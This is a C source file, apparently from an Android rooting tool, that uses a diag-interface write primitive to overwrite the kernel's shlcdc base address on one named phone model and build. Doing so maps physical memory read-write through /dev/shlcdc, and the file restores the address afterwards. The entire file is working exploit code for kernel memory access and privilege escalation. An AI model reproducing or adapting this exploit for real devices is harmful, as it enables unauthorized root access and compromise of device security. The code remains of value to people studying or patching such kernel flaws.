/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/system_properties.h>

#include "libdiagexploit/diag.h"

#define PAGE_SHIFT 12
#define PHYS_OFFSET 0x40000000

#define MMAP_DEVICE "/dev/shlcdc"

typedef struct _supported_device {
  const char *device;
  const char *build_id;
  unsigned long int shlcdc_base_addr;
} supported_device;

static supported_device supported_devices[] = {
  { "IS17SH", "01.00.03", 0xc0fe848c }
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static unsigned long int
get_shlcdc_base_addr(void)
{
  int i;
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
      return supported_devices[i].shlcdc_base_addr;
    }
  }
  printf("%s (%s) is not supported.\n", device, build_id);

  return 0;
}

static bool
inject_address(unsigned int address)
{
  struct diag_values injection_data[2];
  unsigned long int target_address;

  target_address = get_shlcdc_base_addr();
  if (!target_address)
    return false;

  injection_data[0].address = target_address;
  injection_data[0].value = (address & 0xffff);

  injection_data[1].address = target_address + 2;
  injection_data[1].value = (address & 0xffff0000) >> 16;

  return diag_inject(injection_data, 2);
}

static bool
set_mmap_address(unsigned int address)
{
  return inject_address(address);
}

static bool
fake_shlcdc_base_addr(void)
{
  if (!set_mmap_address((PHYS_OFFSET << PAGE_SHIFT))) {
    printf("Failed to fake shlcdc_base_addr due to %s\n",
           strerror(errno));
    return false;
  }
  return true;
}

static bool
restore_shlcdc_base_addr(void)
{
  if (!set_mmap_address(0x8B000000)) {
    printf("Failed to restore shlcdc_base_addr due to %s\n",
           strerror(errno));
    return false;
  }
  return true;
}

int
shlcdc_mmap_device_open(void)
{
  int fd;

  if (!fake_shlcdc_base_addr()) {
    return -1;
  }

  fd = open(MMAP_DEVICE, O_RDWR);
  if (fd < 0) {
    printf("Failed to open " MMAP_DEVICE " due to %s\n", strerror(errno));
  }

  return fd;
}

void *
shlcdc_mmap(void *address, size_t length, int fd)
{
  unsigned int *mmap_address = NULL;

  mmap_address = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
  if (mmap_address == MAP_FAILED) {
    printf("Failed to mmap due to %s\n", strerror(errno));
  }
  return mmap_address;
}

bool
shlcdc_munmap(void *address, size_t length)
{
  munmap(address, length);
  return restore_shlcdc_base_addr();
}

/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
